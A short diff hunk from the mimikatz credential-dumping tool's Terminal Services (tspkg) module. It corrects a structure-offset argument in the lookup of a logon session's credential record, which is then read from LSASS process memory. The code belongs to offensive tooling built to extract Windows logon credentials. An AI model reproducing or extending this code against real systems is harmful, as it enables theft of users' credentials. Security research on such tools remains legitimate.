@@ -72,7 +72,7 @@ bool WINAPI mod_mimikatz_sekurlsa_tspkg::getTsPkgLogonData(__in PLUID logId, __i
 	{
 		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
 		BYTE * monBuffP = new BYTE[sizeof(KIWI_TS_CREDENTIAL)], * monBuffC = new BYTE[sizeof(KIWI_TS_PRIMARY_CREDENTIAL)];
-		if(PKIWI_TS_CREDENTIAL pLogSession = reinterpret_cast<PKIWI_TS_CREDENTIAL>(mod_mimikatz_sekurlsa::getPtrFromAVLByLuid(TSGlobalCredTable, FIELD_OFFSET(KIWI_TS_CREDENTIAL_AVL_SEARCH, LocallyUniqueIdentifier), logId)))
+		if(PKIWI_TS_CREDENTIAL pLogSession = reinterpret_cast<PKIWI_TS_CREDENTIAL>(mod_mimikatz_sekurlsa::getPtrFromAVLByLuid(TSGlobalCredTable, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), logId)))
 		{
 			if(mod_memory::readMemory(pLogSession, monBuffP, sizeof(KIWI_TS_CREDENTIAL), mod_mimikatz_sekurlsa::hLSASS))
 			{
